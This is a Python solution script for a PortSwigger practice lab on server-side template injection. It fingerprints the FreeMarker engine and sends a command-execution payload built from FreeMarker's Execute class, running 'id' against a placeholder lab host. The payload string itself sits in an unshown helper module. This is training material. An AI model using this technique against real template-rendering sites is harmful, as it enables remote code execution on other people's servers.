"""
Lab 3: Server-side template injection using documentation
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation
Difficulty: Practitioner

📝 FreeMarker. Identify via error message/probe syntax, then the exploit
comes straight from FreeMarker's own docs for the `Execute` utility class —
a feature meant for template authors to shell out, repurposed here.
"""

from utils import get_session, log, note, identify_engine, format_rce, FREEMARKER_RCE

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
PREFERENCES_PATH = "/my-account/change-blog-post-author-display"  # confirm exact vulnerable field


def inject(session, payload):
    r = session.post(f"{TARGET}{PREFERENCES_PATH}", data={"blog-post-author-display": payload})
    return r.text


def run():
    s = get_session()

    note("Identifying the engine via math-probe syntax across common engines.")
    hits = identify_engine(s, TARGET, inject)
    log(f"Probes that evaluated: {hits}")

    cmd = "id"
    payload = format_rce(FREEMARKER_RCE, cmd)
    note(f"FreeMarker Execute-utility payload: {payload}")

    text = inject(s, payload)
    print(text[-500:])
    note("Per FreeMarker's docs, freemarker.template.utility.Execute wraps")
    note("Runtime.exec() specifically for template authors — official")
    note("functionality, repurposed. Look it up directly if curious:")
    note("https://freemarker.apache.org/docs/api/freemarker/template/utility/Execute.html")


if __name__ == "__main__":
    run()
